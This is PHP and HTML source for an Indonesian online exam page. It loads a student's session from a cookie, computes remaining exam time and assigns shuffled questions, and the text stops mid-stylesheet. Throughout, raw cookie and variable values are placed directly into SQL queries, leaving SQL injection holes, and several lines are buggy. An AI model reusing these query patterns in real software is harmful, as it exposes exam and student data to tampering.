<?php error_reporting (E_ALL ^ E_NOTICE); ?>
<?php
if(!isset($_COOKIE['PESERTA'])) {
header('Location:index.php');
} 
include "config/server.php";
include "config/fungsi_jam.php";
include "ip.php";

$tglbuat = date("Y-m-d");	
	$xtgl1 = date("Y-m-d");
	$xjam1 = date("H:i:s");
	
  $user = $_COOKIE['PESERTA'];

  $sqluser = mysqli_query($sqlconn, "
  SELECT * , u.XKodeKelas AS kelaz, s.XKodeKelas AS kelasx, s.XKodeJurusan AS jurusx, u.XKodeSoal AS soalz, u.XKodeUjian AS ujianz,s.XSesi as sesiz,
  s.XSetId as setidx,u.XKodeMapel as mapelx,u.XSemester as semex FROM cbt_siswa s 
LEFT JOIN cbt_ujian u ON (s.XKodeKelas = u.XKodeKelas or u.XKodeKelas = 'ALL') 
and (s.XKodeJurusan = u.XKodeJurusan or u.XKodeJurusan = 'ALL')
LEFT JOIN cbt_mapel m on m.XKodeMapel = u.XKodeMapel WHERE s.XNomerUjian = 
  '$_COOKIE[PESERTA]' and u.XStatusUjian = '1'");


  $s = mysqli_fetch_array($sqluser);
  $val_siswa = $s['XNamaSiswa'];
  $xnamakelas = $s['XNamaKelas'];
  $xsesi = $s['sesiz'];
  $xkodesoal = $s['soalz'];
  $xkodemapel = $s['mapelx'];
  $xsemester = $s['semex'];  
  $xkodekelas = $s['kelaz'];
  $xkodekelasx = $s['kelasx'];
  $xkodejurusx = $s['jurusx']; 
  $xkodeujianx = $s['ujianz']; 
  $xsetidx = $s['setidx'];    
  $xjumlahsoal = $s['XJumSoal'];
  $xtokenujian = $s['XTokenUjian'];  
  $xbatasmasuk= $s['XBatasMasuk'];   
  $xnamamapel = $s['XNamaMapel'];
  $xjamujian = $s['XJamUjian']; 
  $xjumpilg = $s['XPilGanda'];   
  $xjumesai = $s['XEsai'];     
  $xacaksoal = $s['XAcakSoal'];  
  $xjumlahpilihan = $s['XJumPilihan'];
  $xtglujian = $s['XTglUjian'];
  $xmaxlambat = $s['XLambat'];
  $xagama = $s['XAgama']; 
  $xmapelagama = $s['XMapelAgama']; 
  $xpilih = $s['XPilihan'];    
    
  $xjumlahpilganda = $s['XPilGanda'];
  $xjumlahesai = $s['XEsai'];  
  $poto = $s['XFoto'];  
  
  if($poto==''){
	  $gambar="avatar.gif";
  } else{
	  $gambar=$poto;
  }
  
 $sqlIP = mysqli_query($sqlconn, "SELECT * FROM  `cbt_siswa_ujian` WHERE XNomerUjian = '$user' and XTokenUjian = '$xtokenujian'");
 $ad0 = mysqli_fetch_array($sqlIP);
 $user_ip2 = str_replace(" ","",$ad0['XGetIP']); 
 $sqlIP1 = mysqli_query($sqlconn, "update `cbt_siswa_ujian` set XGetIP = '$user_ip' WHERE XNomerUjian = '$user' and XTokenUjian = '$xtokenujian'");

$sqlnk = mysqli_query($sqlconn, "SELECT * FROM  `cbt_siswa` WHERE XNomerUjian = '$user'");
$sNK = mysqli_fetch_array($sqlnk);
$NK = str_replace(" ","",$sNK['XNamaKelas']); 
$sqlNKsj = mysqli_query($sqlconn, "update `cbt_siswa_ujian` set XNamaKelas = '$NK' WHERE XNomerUjian = '$user' and XTokenUjian = '$xtokenujian'");
$kodekelas =  $sNK['XKodeKelas'];
$kodejurusan =  $sNK['XKodeJurusan'];

if($xtglujian <> $xtgl1){
header('Location:index.php');
} 

//********************* JIKA TERLAMBAT MASIH DIKASIH WAKTU YANG SAMA ***************
//                      DENGAN SISWA TDK TERLAMBAT , MAKA XLAMAUJIAN = XLAMA UJIAN 

  $xlamaujian= $s['XLamaUjian']; 
//**********************************************************************************

//********************* JIKA SISWA TERLAMBAT WAKTU ENGERJAAN LEBIH SEDIKIT DARI
//                      SISWA TDK TERLAMBAT , MAKA XLAMAUJIAN = XLAMAUJIAN - (XMULAIUJIAN - XJAMUJIAN)
$jm1 = substr($xjam1,0,2);
$mn1 = substr($xjam1,3,2);
$dt1 = substr($xjam1,6,2); // pecah xmulaiujian ambil dari jamsekarang

$jm2 = substr($xjamujian,0,2);
$mn2 = substr($xjamujian,3,2);
$dt2 = substr($xjamujian,6,2);// pecah xjamujian 

$tg1 = substr($xtgl1,8,2);
$bl1 = substr($xtgl1,5,2);
$th1 = substr($xtgl1,0,4);
//mktime(hour,minute,second,month,day,year,is_dst) 
$selstart = mktime($jm1,$mn1,$dt1,$bl1,$tg1,$th1); /// jam mulai ujian
$selend = mktime($jm2,$mn2,$dt2,$bl1,$tg1,$th1); /// jam terakhir di database
$diffsec =  $selstart-$selend;
$hr = (int) ($diffsec / 3600);
$mn = (int) (($diffsec % 3600) / 60);
$sc =  $diffsec - ($hr*3600 + $mn * 60); // Hasil pengurangan (XMULAIUJIAN - XJAMUJIAN)

$jm3 = substr($xlamaujian,0,2);
$mn3 = substr($xlamaujian,3,2);
$dt3 = substr($xlamaujian,6,2);// pecah xlamaujian 
$selstart2 = mktime($jm3,$mn3,$dt3,$bl1,$tg1,$th1); /// jam xlamaujian
$selend2 = mktime($hr,$mn,$sc,$bl1,$tg1,$th1); /// jam terakhir di database

$diffsec2 =  $selstart2-$selend2;
$hr2 = (int) ($diffsec2 / 3600);
$mn2 = (int) (($diffsec2 % 3600) / 60);
$sc2 =  $diffsec2 - ($hr2*3600 + $mn2 * 60); // Hasil pengurangan (XMULAIUJIAN - XJAMUJIAN)

if($hr2=="0"){$hr2="00";}
if($mn2=="0"){$mn2="00";}
if($sc2=="0"){$sc2="00";}

$hrz = strlen($hr2);
$mnz = strlen($mn2);

if($hrz<2){$hr2 = "0".$hr2;}else{$hr2=$hr2;}
if($mnz<2){$mn2 = "0".$mn2;}else{$mn2=$mn2;}

$sisawaktu = "$hr2:$mn2:$sc2";
//*********************************************************************************************
  
//cek data siswa ujian
$sqlceksiswa = mysqli_query($sqlconn, "select * from cbt_siswa_ujian where XNomerUjian = '$user' and XKodeSoal = '$xkodesoal' and XTokenUjian ='$xtokenujian' and XSesi ='$xsesi'"); 
$jumsqlceksiswa = mysqli_num_rows($sqlceksiswa); 
$s2 = mysqli_fetch_array($sqlceksiswa);

//cek status ujian jika status = 9 maka sudah selesai redirect ke logout
  $xstatusujian = $s2['XStatusUjian'];
  if($xstatusujian==9){
   header('location:logout.php');
  }


//bandingkan jam sekarang dengan jam 	
//echo "";
if($jumsqlceksiswa<1){ // jika siswa belum pernah login 


		if($xjam1>$xbatasmasuk){
		$sqlout = mysqli_query($sqlconn, "Update cbt_siswa_ujian set XStatusUjian = '9' where XNomerUjian = '$user' and XStatusUjian = '1' and XTokenUjian ='$xtokenujian' and XSesi ='$xsesi'");
		// header('location:logout.php');
		} 
  
if($xmaxlambat==1){
//echo "Jam Mulai |$xjam1|";  
//******************* jika jam terlambat diperhitungkan 
$xlamaujian = $sisawaktu ;
} elseif($xmaxlambat==0) {
//******************* jika jam terlambat diperhitungkan 
$xlamaujian = $xlamaujian ;
}

  $xjumlahjam = $xlamaujian;
  $xjam = substr($xjumlahjam,0,2);
  $xmnt = substr($xjumlahjam,3,2);
  $xdtk = substr($xjumlahjam,6,2);
  
//  echo "$xjumlahjam  $xjam:$xmnt:$xdtk ";
$xtgl1 = "$xtgl1 $xjam1";


	$sqlinputsiswa = mysqli_query($sqlconn, "insert into cbt_siswa_ujian 
	(XNomerUjian, XKodeKelas, XKodeMapel,XKodeSoal,XJumSoal,XTglUjian,XJamUjian, XMulaiUjian, XLastUpdate, XLamaUjian,XTokenUjian,XStatusUjian,XSesi,XPilGanda,XEsai,XGetIP) values 
	('$user','$xkodekelasx','$xkodemapel','$xkodesoal','$xjumlahsoal','$xtgl1','$xjamujian','$xjam1',
	'$xjam1','$xlamaujian','$xtokenujian','1','$xsesi','$xjumpilg','$xjumesai','$user_ip')"); 


} else {


$tglbalik = date("H:i:s");
if(isset($_COOKIE['PESERTA'])){
$user = $_COOKIE['PESERTA'];
$sql = mysqli_query($sqlconn, "Update cbt_siswa_ujian set XLastUpdate = '$tglbalik'  where XNomerUjian = '$user' and XStatusUjian = '1' ");
}

$j1 = substr($s2['XMulaiUjian'],0,2);
$m1 = substr($s2['XMulaiUjian'],3,2);
$d1 = substr($s2['XMulaiUjian'],6,2);

$j2 = substr($s2['XLastUpdate'],0,2);
$m2 = substr($s2['XLastUpdate'],3,2);
$d2 = substr($s2['XLastUpdate'],6,2);

$sekarang = date("Y-m-d");
$tgls = substr($sekarang,8,2);
$blns = substr($sekarang,5,2);
$thns = substr($sekarang,0,4);
//mktime(hour,minute,second,month,day,year,is_dst) 
$start = mktime($j1,$m1,$d1,$blns,$tgls,$thns); /// jam mulai ujian
$end = mktime($j2,$m2,$d2,$blns,$tgls,$thns); /// jam terakhir di database

//ambil  waktu yang sdh dipakai = jam terakhir di database - jam mulai ujian
$diffSeconds =  $end-$start;
$hrs = (int) ($diffSeconds / 3600);
$mins = (int) (($diffSeconds % 3600) / 60);
$secs =  $diffSeconds - ($hrs *3600 + $mins * 60);

//=============  waktu yang sdh dipakai
//echo "$hrs $mins $secs |<br>$j1,$m1,$d1,$blns,$tgls,$thns <br>$j2,$m2,$d2,$blns,$tgls,$thns";//11:09
 
//*********************** Jam Timer = XLamaUjian - ($hrs $mins $secs)
$awal = mktime($hrs,$mins,$secs,$blns,$tgls,$thns); /// Waktu Yang sudah dipakai

//============= mengambil dan memecah XLamaUjian
$j3 = substr($s2['XLamaUjian'],0,2);
$m3 = substr($s2['XLamaUjian'],3,2);
$d3 = substr($s2['XLamaUjian'],6,2);

$akhir = mktime($j3,$m3,$d3,$blns,$tgls,$thns); /// XLamaUjian

//ambil  waktu yang sdh dipakai = jam terakhir di database - jam mulai ujian
$diffSeconds3 =  $akhir-$awal;
$hrs3 = (int) ($diffSeconds3 / 3600);
$mins3 = (int) (($diffSeconds3 % 3600) / 60);
$secs3 =  $diffSeconds3 - ($hrs3 *3600 + $mins3 * 60);
//echo "<br>==$hrs3:$mins3:$secs3" ;
 
//echo "$hrs:$mins:$secs" ;
//add time
	if(isset($xjam)){$jatahjam = $xjam;}
	if(isset($xmnt)){$jatahmnt = $xmnt;}
	if(isset($xjatahjam)&&isset($xjatahmnt)){$menit = $jatahmnt+($jatahjam*60);}
	if(isset($xmenit)){$timestamp = strtotime($s2['XMulaiUjian']) + $menit*60;}
	if(isset($timestamp)){
	$tjam = date('H', $timestamp);
	$tmnt = date('i', $timestamp);
	$tdtk = date('s', $timestamp); 
	}
//echo "$jatahjam";
//Nilai Akhir yang muncul di Timer Countdown

  $xjam = $hrs3;
  $xmnt = $mins3;
  $xdtk = $secs3;

}
include "modal.php"; 
?>

<!DOCTYPE html>
<!-- <script type="text/javascript" src="mesin/js/jquery.js"></script> !-->
 <script src="mesin/js/jquery-scrolltofixed.js" type="text/javascript"></script>

<script>
    $(document).ready(function() {
		
		$(function(){//document ready event
   setTimeout(function(){
        $("#myModal").show();
   },5000);//set interval to 3 second
}); 
        // Dock the header to the top of the window when scrolled past the banner.
        // This is the default behavior.

        $('.header').scrollToFixed();
        // Dock the footer to the bottom of the page, but scroll up to reveal more
        // content if the page is scrolled far enough.

        $('.footer').scrollToFixed( {
            bottom: 0,
            limit: $('.footer').offset().top
        });


        // Dock each summary as it arrives just below the docked header, pushing the
        // previous summary up the page.

        var summaries = $('.summary');
        summaries.each(function(i) {
            var summary = $(summaries[i]);
            var next = summaries[i + 1];

            summary.scrollToFixed({
                marginTop: $('.header').outerHeight(true) + 10,
                limit: function() {
                    var limit = 0;
                    if (next) {
                        limit = $(next).offset().top - $(this).outerHeight(true) - 10;
                    } else {
                        limit = $('.footer').offset().top - $(this).outerHeight(true) - 10;
                    }
                    return limit;
                },
                zIndex: 999
            });
        });
    });
</script>   
<html class="no-js" lang="en">
<!--Kode untuk mematikan fungsi klik kanan di blog-->
<script type="text/javascript">
function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
</script>
<script type="text/javascript">
window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
</script>
<script type="text/javascript">
document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
</script>  
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title><?php echo $h2; ?> | Login Untuk Memulai Ujian</title>
        <!-- Tell the browser to be responsive to screen width -->
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <meta name="description" content="Aplikasi UNBK, membantu anda sukses dalam ujian dengan memulai belajar test berbasis Komputer dengan beragam soal-soal ujian."> 
        <meta name="keyword" content="UNBK, Ujian, Ujian Nasional, Ulangan Harian, Ulangan Semester, Mid Semester, Test CPNS, Test SMBPTN">
        <meta name="google" content="nositelinkssearchbox" />
        <meta name="robots" content="index, follow">
    
        <link href="css/bootstrap.min.css" rel="stylesheet">
      <link href="css/main.css" rel="stylesheet">
      <link href="css/mainam.css" rel="stylesheet">
      <link href="css/mainan.css" rel="stylesheet">
      <link href="css/selectbox.min.css" rel="stylesheet">
    
      <!-- jQuery 3 -->
      <script src="css/jquery.min.js"></script>
    <script>
      function disableBackButton() {window.history.forward();}
      setTimeout("disableBackButton()", 0);
    </script>
    
    <link href="mesin/css/klien.css" rel="stylesheet">
    <link rel="stylesheet" href="mesin/css/bootstrap2.min.css">
      <script src="mesin/js/inline.js"></script>


	<link href='images/icon.png' rel='icon' type='image/png'/>
<style>
    .no-close .ui-dialog-titlebar-close {
        display: none;
    }
</style>
	
	
	
<script>$("input").on("click", function(){
  if ( $(this).attr("type") === "radio" ) {
    $(this).parent().siblings().removeClass("isSelected");
  }
  $(this).parent().toggleClass("isSelected");
});</script>
    
<script type="text/javascript" src="css/js/sidein_menu.js"></script>


<script type="text/javascript" src="css/js/jquery.min.js"></script>
<script>
function showUser(str) {
	alert();
	$.ajax({
//this was the confusing part...did not know how to pass the data to the script
      url: 'simpanragu.php',
      type: 'post',
      data: 'who='+who+'&chk='+chk,
        success: function(data)
        { return false;
		}
   });
   return false;
}
</script>
<script> 
function  toggle_select(id) {
	var anu = document.getElementById(id);
    var X = document.getElementById(id);
    if (X.checked == true) {
     X.value = "1";
    } else {
    X.value = "0";
    }
	
//var sql="update clients set calendar='" + X.value + "' where cli_ID='" + X.id + "' limit 1";
var who=X.id;
var chk=X.value

//alert(who+"Ujian"+chk);

//alert("Joe is still debugging: (function incomplete/database record was not updated)\n"+ sql);
  $.ajax({
//this was the confusing part...did not know how to pass the data to the script
      url: 'simpanragu.php',
      type: 'post',
      data: 'who='+who+'&chk='+chk+'&anu='+anu,
        success: function(data)
        { return false;
      /*
	  success: function(output) 
      { alert('success, server says '+output);
	  return false;
      },
      error: function()
      { alert('something went wrong, save failed');
	  return false;
      }
	  */
		}
   });
   return false;
   
    
   
}
</script>



<?php 
$cek = mysqli_num_rows(mysqli_query($sqlconn, "select * from cbt_jawaban where XKodeSoal = '$xkodesoal' and XUserJawab = '$user' and XTokenUjian = '$xtokenujian'"));
if($cek<1){  
$hit = 1;


  if($xmapelagama=='Y'){
  $sqlambilsoalpilT1 = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '1' and XAcakSoal = 'T' and XAgama = '$xpilih' order by Urut LIMIT  $xjumpilg");
  }else  if($xmapelagama=='A'){
  $sqlambilsoalpilT1 = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '1' and XAcakSoal = 'T' and XAgama = '$xagama' order by Urut LIMIT  $xjumpilg");
  } else {
  $sqlambilsoalpilT1 = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '1' and XAcakSoal = 'T' order by Urut LIMIT  $xjumpilg");
  }  
  while($r2=mysqli_fetch_array($sqlambilsoalpilT1)){
	if($xjumlahpilihan==3){
    $a=array("1","2","3");
		
		if($r2['XAcakOpsi']=='Y'){ //jika opsijawaban diacak
		shuffle($a); }

	$A1 = $a[0];
	$B1 = $a[1];
	$C1 = $a[2];
	$var = array_search($r2['XKunciJawaban'],$a);
	$kuncijawab1 = $var+1;
	if($kuncijawab1=='1'){$kuncijawab = $A1;}
	if($kuncijawab1=='2'){$kuncijawab = $B1; }	
	if($kuncijawab1=='3'){$kuncijawab = $C1; }
			
	$sql = mysqli_query($sqlconn, "insert into cbt_jawaban (Urut,XNomerSoal,XUserJawab,XKodeSoal,XTokenUjian,XKunciJawaban,XA,XB,XC,XTglJawab,XJenisSoal,XKodeKelas,XKodeJurusan,XKodeUjian,XSetId,XKodeMapel,XSemester) values 
	('$hit','$r2[XNomerSoal]','$user','$xkodesoal','$xtokenujian','$kuncijawab','$A1','$B1','$C1','$tglbuat','1','$xkodekelasx','$xkodejurusx','$xkodeujianx',
'$xsetidx','$xkodemapel','$xsemester')"); 
	$hit = $hit+1;
	} 
	elseif($xjumlahpilihan==4){
	$a=array("1","2","3","4");
		
		if($r2['XAcakOpsi']=='Y'){ //jika opsijawaban diacak
		shuffle($a); }

	$A1 = $a[0];$X1 = "XGambarJawab1$A1";
	$B1 = $a[1];
	$C1 = $a[2];
	$D1 = $a[3];
	
	$var = array_search($r2['XKunciJawaban'],$a);
	$kuncijawab1 = $var+1;
	if($kuncijawab1=='1'){$kuncijawab = $A1;}
	if($kuncijawab1=='2'){$kuncijawab = $B1; }	
	if($kuncijawab1=='3'){$kuncijawab = $C1; }
	if($kuncijawab1=='4'){$kuncijawab = $D1; }	

		
	$sql = mysqli_query($sqlconn, "insert into cbt_jawaban (Urut,XNomerSoal,XUserJawab,XKodeSoal,XTokenUjian,XKunciJawaban,XA,XB,XC,XD,XTglJawab,XJenisSoal,XKodeKelas,XKodeJurusan,XKodeUjian,XSetId,XKodeMapel,XSemester) values 	
	('$hit','$r2[XNomerSoal]','$user','$xkodesoal','$xtokenujian','$kuncijawab]',
	'$A1','$B1','$C1','$D1','$tglbuat','1','$xkodekelasx','$xkodejurusx','$xkodeujianx',
'$xsetidx','$xkodemapel','$xsemester')"); 
	$hit = $hit+1;
	} 
	elseif($xjumlahpilihan==5){
    $a=array("1","2","3","4","5");
		
		if($r2['XAcakOpsi']=='Y'){ //jika opsijawaban diacak
		shuffle($a); }

	$A1 = $a[0];
	$B1 = $a[1];
	$C1 = $a[2];
	$D1 = $a[3];
	$E1 = $a[4];	
	$var = array_search($r2['XKunciJawaban'],$a);
	$kuncijawab1 = $var+1;
	if($kuncijawab1=='1'){$kuncijawab = $A1;}
	if($kuncijawab1=='2'){$kuncijawab = $B1; }	
	if($kuncijawab1=='3'){$kuncijawab = $C1; }
	if($kuncijawab1=='4'){$kuncijawab = $D1; }	
	if($kuncijawab1=='5'){$kuncijawab = $E1; }	


		
	$sql = mysqli_query($sqlconn, "insert into cbt_jawaban (Urut,XNomerSoal,XUserJawab,XKodeSoal,XTokenUjian,XKunciJawaban,XA,XB,XC,XD,XE,XTglJawab,XJenisSoal,XKodeKelas,XKodeJurusan,XKodeUjian,XSetId,XKodeMapel,XSemester) values 
	('$hit','$r2[XNomerSoal]','$user','$xkodesoal','$xtokenujian','$kuncijawab','$A1','$B1','$C1','$D1','$E1','$tglbuat','1','$xkodekelasx','$xkodejurusx','$xkodeujianx',
'$xsetidx','$xkodemapel','$xsemester')"); 
	$hit = $hit+1;
	} 
 	
  }
  
  
  // jumlah soal tidak acak harus tampil semua
  $jmlpilT = mysqli_num_rows($sqlambilsoalpilT1);
  // jumlah soal tersisa buat yg acak adalah $jmlpilA
  $jmlpilA = $xjumpilg - $jmlpilT;
  
  if($xmapelagama=='Y'){
  $sqlambilsoalpilA2 = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '1' and XAcakSoal = 'A' and XAgama = '$xpilih'
   order by RAND() LIMIT  $jmlpilA");
  }elseif($xmapelagama=='A'){
  $sqlambilsoalpilA2 = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '1' and XAcakSoal = 'A' and XAgama = '$xagama'
   order by RAND() LIMIT  $jmlpilA");
  } else {
  $sqlambilsoalpilA2 = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '1' and XAcakSoal = 'A' order by RAND() LIMIT  $jmlpilA");  
  }
  while($r2=mysqli_fetch_array($sqlambilsoalpilA2)){
	if($xjumlahpilihan==3){
    $a=array("1","2","3");

		if($r2['XAcakOpsi']=='Y'){ //jika opsijawaban diacak
		shuffle($a); }

	$A1 = $a[0];
	$B1 = $a[1];
	$C1 = $a[2];
		
	$sql = mysqli_query($sqlconn, "insert into cbt_jawaban (Urut,XNomerSoal,XUserJawab,XKodeSoal,XTokenUjian,XKunciJawaban,XA,XB,XC,XTglJawab,XJenisSoal,XKodeKelas,XKodeJurusan,XKodeUjian,XSetId,XKodeMapel,XSemester) values 
	('$hit','$r2[XNomerSoal]','$user','$xkodesoal','$xtokenujian','$r2[XKunciJawaban]','$A1','$B1','$C1','$tglbuat','1','$xkodekelasx','$xkodejurusx','$xkodeujianx',
'$xsetidx','$xkodemapel','$xsemester')"); 
	$hit = $hit+1;
	} 	
	  
	elseif($xjumlahpilihan==4){
	$a=array("1","2","3","4");
		
		if($r2['XAcakOpsi']=='Y'){ //jika opsijawaban diacak
		shuffle($a); }

	$A1 = $a[0];
	$B1 = $a[1];
	$C1 = $a[2];
	$D1 = $a[3];
	$sql = mysqli_query($sqlconn, "insert into cbt_jawaban (Urut,XNomerSoal,XUserJawab,XKodeSoal,XTokenUjian,XKunciJawaban,XA,XB,XC,XD,XTglJawab,XJenisSoal,XKodeKelas,XKodeJurusan,XKodeUjian,XSetId,XKodeMapel,XSemester) values 	
	('$hit','$r2[XNomerSoal]','$user','$xkodesoal','$xtokenujian','$r2[XKunciJawaban]','$A1','$B1','$C1','$D1','$tglbuat','1','$xkodekelasx','$xkodejurusx','$xkodeujianx',
'$xsetidx','$xkodemapel','$xsemester')"); 
	$hit = $hit+1;
	} 
	elseif($xjumlahpilihan==5){
    $a=array("1","2","3","4","5");

		if($r2['XAcakOpsi']=='Y'){ //jika opsijawaban diacak
		shuffle($a); }

	$A1 = $a[0];
	$B1 = $a[1];
	$C1 = $a[2];
	$D1 = $a[3];
	$E1 = $a[4];	
	$sql = mysqli_query($sqlconn, "insert into cbt_jawaban (Urut,XNomerSoal,XUserJawab,XKodeSoal,XTokenUjian,XKunciJawaban,XA,XB,XC,XD,XE,XTglJawab,XJenisSoal,XKodeKelas,XKodeJurusan,XKodeUjian,XSetId,XKodeMapel,XSemester) values 
	('$hit','$r2[XNomerSoal]','$user','$xkodesoal','$xtokenujian','$r2[XKunciJawaban]','$A1','$B1','$C1','$D1','$E1','$tglbuat','1','$xkodekelasx','$xkodejurusx','$xkodeujianx',
'$xsetidx','$xkodemapel','$xsemester')"); 
	$hit = $hit+1;
	} 

  }
  
//Ambil Soal Esai 
//  $xjumlahesai = $s['XEsai'];  
if($xmapelagama=='A'){
  $sqlambilsoalesai = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '2' and XAcakSoal = 'T' and XAgama = '$xagama' order by Urut LIMIT $xjumesai");
} 
elseif($xmapelagama=='Y'){
  $sqlambilsoalesai = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '2' and XAcakSoal = 'T' and XAgama = '$xpilih' order by Urut LIMIT $xjumesai");
} 
else {
  $sqlambilsoalesai = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '2' and XAcakSoal = 'T' order by Urut LIMIT $xjumesai");
}  
  while($r1=mysqli_fetch_array($sqlambilsoalesai)){
	  $sqlsimpanesai = mysqli_query($sqlconn, "insert into cbt_jawaban (Urut,XNomerSoal,XUserJawab,XKodeSoal,XTokenUjian,XTglJawab,XJenisSoal,XKodeKelas,XKodeJurusan,XKodeUjian,XSetId,XKodeMapel,XSemester) values 	
	  ('$hit','$r1[XNomerSoal]','$user','$xkodesoal','$xtokenujian','$tglbuat','2','$xkodekelasx','$xkodejurusx','$xkodeujianx','$xsetidx','$xkodemapel','$xsemester'  
)");  
	 $hit = $hit+1;	  
  }
  //esai utama harus muncul bila acak=T
  $jmlesaiutama = mysqli_num_rows($sqlambilsoalesai);
  //jika jml esai utama masih < xjumlahesai
  if($jmlesaiutama<$xjumesai){
  //ambil acak esai tambahan sebanyak sisa esai
	  $sisaesai = $xjumesai - $jmlesaiutama;
	  if($xmapelagama=='Y'){
	  $sqlambilsoalesai = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '2' and XAcakSoal = 'A' and XAgama = '$xpilih' order by RAND() 
	  LIMIT $sisaesai");
	  }elseif($xmapelagama=='A'){
	  $sqlambilsoalesai = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '2' and XAcakSoal = 'A' and XAgama = '$xagama' order by RAND() 
	  LIMIT $sisaesai");
	  } else {
	  $sqlambilsoalesai = mysqli_query($sqlconn, "select * from cbt_soal where XKodeSoal = '$xkodesoal' and XJenisSoal = '2' and XAcakSoal = 'A' order by RAND() LIMIT $sisaesai");
	  }
 	  while($r2=mysqli_fetch_array($sqlambilsoalesai)){
	  $sqlsimpanesai = mysqli_query($sqlconn, "insert into cbt_jawaban (Urut,XNomerSoal,XUserJawab,XKodeSoal,XTokenUjian,XTglJawab,XJenisSoal,XKodeKelas,XKodeJurusan,XKodeUjian,XSetId,XKodeMapel,XSemester) values 	
	  ('$hit','$r2[XNomerSoal]','$user','$xkodesoal','$xtokenujian','$tglbuat','2','$xkodekelasx','$xkodejurusx','$xkodeujianx','$xsetidx','$xkodemapel','$xsemester')");  
	  $hit = $hit+1;
	  }
	  
  }
  
$xjumlahsoalpil = $xjumlahsoal - $xjumlahesai;

 } 
  ?> 
 <style>

.bingkai{
  width: 100%;
  height: 400px;
  position: relative;

}
.dmlogo{
  position: absolute;
  width: 50px;

}
.dmnama{
  position: absolute;
  right: 0;
    top: 0px;
    right: 7%;
    width: 150px;
}
.dmimg{
  position: absolute;
  right: 0;
    top: 0px;
    right: 3%;
    
}

#fontlembarsoal{
  margin-top:1px;
  margin-left:0px;
  width: 100%;
  margin-bottom:0px;
  margin-right:1px;
  background-color:#f0efef;
  font-size:14px;
  font-weight:bold;
  height:45px;
  left:40px;
  padding-top:10px; 
  padding-bottom:3px; 
  }

#tulisansoal{ 
  background-color:#fff;
  height:90px;
  font-size:18px;
  font-weight:bold;
  vertical-align:middle;
  top:495px;
}
.tulisansoal{ 
  background-color:#fff;
  height:90px;
  font-size:18px;
  font-weight:bold;
  vertical-align:middle;
  top:495px;
}
.nomersoal{ 
  top:25px; width:100px;
  background-color:#336898;
  color:#fff;
  height:90px;
  font-size:18px;
  font-weight:bold;
  vertical-align:middle;  
  } 

#lembarsoal{
  margin-top:-8px;
  margin-left:15px;
  margin-bottom:2px;
  margin-right:15px;
  background-color:#fff;
  height:150%;
      border-radius: 30px;
  border-style:solid;
  border-color:#999;
  } 
  
#hurufsoal{
    padding-left: 30px;
  padding-top:2px;
  padding-bottom:2px;
}

#tampilkan {
    background-color: #336898;
    width: 150px;
    height: 50px;
    margin-right: 20px;
  margin-top:-10px;
    line-height: 20px;
    color: white;
    font-size: 22px;
    text-align: center;
  padding-left:12px;
  padding-right:12px; 
  padding-top:14px;
  padding-bottom:14px;
  float:right;
} 
#kotaksoal{
  width:97%;
  margin:0px auto;
  padding:20px;
  border:solid;
  top:30px;
  border-color:#CCC;
  
}
p{
  padding:1px;
  font-size: 16px;
  }
li{
  list-style:none;
  font-size:18px;
  }

  #lembaran{
  padding:30px;

  margin-left:1px;
  margin-right:1px;
  top:0px;
  font-size: 12pt;
  background-color:#fff;
  border:solid;
  border-color:#fff;
 
  } 
  #lembaransoal{
  padding:20px;
  width: 100%;
  size: unset;
  font-size: 12pt;
  border:solid;
  border-color:#fff;
   box-shadow:0 1px 1px rgba(0,0,0,0.11),0 2px 2px rgba(0,0,0,0.11),0 4px 4px rgba(0,0,0,0.11),0 6px 8px rgba(0,0,0,0.11),0 8px 16px rgba(0,0,0,0.11);
  } 
.jawab  {
  font-size: 10pt;
  }
.jawaban  {
  padding-bottom:5px;
  font-size: 10pt;
  border:solid;
  border-color:#CCC;
  } 
.pilihanjawaban {
  font-size: 10pt;
  padding-bottom:15px;
  } 

.noti-jawab {
    position:absolute;
    background-color:white;
    color:#999;
    padding:4px;
    -webkit-border-radius: 30px;
    -moz-border-radius: 30px;
    border-radius: 30px;
  border-style:solid;
  border-color:#999;
    width:30px;
    height:30px;
    text-align:center;
}

  
    </style>
    
    <style>
.cc-selector input{
  margin-left:0px;
  padding:0;
    -webkit-appearance:none;
       -moz-appearance:none;
            appearance:none;
              margin-top:-90px;
        top:-90px;
}
.A{background-image:url(images/A.png);}
.B{background-image:url(images/B.png);}
.C{background-image:url(images/C.png);}
.D{background-image:url(images/D.png);}
.E{background-image:url(images/E.png);}

.piljwb{
  margin-left:0;    
  border-radius: 30px;
  border-style:solid;
  border-color:#999;
  list-style:none;}

.cc-selector input:active +.drinkcard-cc{opacity: .9;}
.cc-selector input:checked +.drinkcard-cc{
  background-image:url(images/pilih.png);
    -webkit-filter: none;
       -moz-filter: none;
            filter: none;
}
.drinkcard-cc{
    cursor:pointer;
    background-size:contain;
    background-repeat:no-repeat;
    display:inline-block;
